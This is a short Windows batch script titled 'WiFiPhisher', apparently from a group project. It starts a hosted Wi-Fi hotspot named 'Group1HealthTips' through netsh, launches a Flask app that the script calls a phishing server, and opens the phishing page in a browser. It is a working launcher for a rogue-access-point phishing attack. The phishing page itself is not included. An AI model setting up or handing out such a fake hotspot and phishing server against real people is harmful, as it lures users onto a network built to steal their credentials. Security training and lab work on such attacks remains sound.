@echo off
title Group1HealthTips WiFiPhisher - start Fake Wifi Group1HealthTips
echo Starting Wi-Fi hotspots...

REM Replace "Group1HealthTips" and "password" with your SSID and password
netsh wlan set hostednetwork mode=allow ssid=Group1HealthTips key=password
netsh wlan start hostednetwork

echo Lauching Flask phising server...
REM Activate virtualenv if neeeded
REM call venv\Scripts\activate

REM Run your app (assumes Python is in PATH)
start cmd /k python app.py

timeout /t 5

echo Opening phishing page in browser...
start http://192.168.0.1:8000

echo Done.
pause
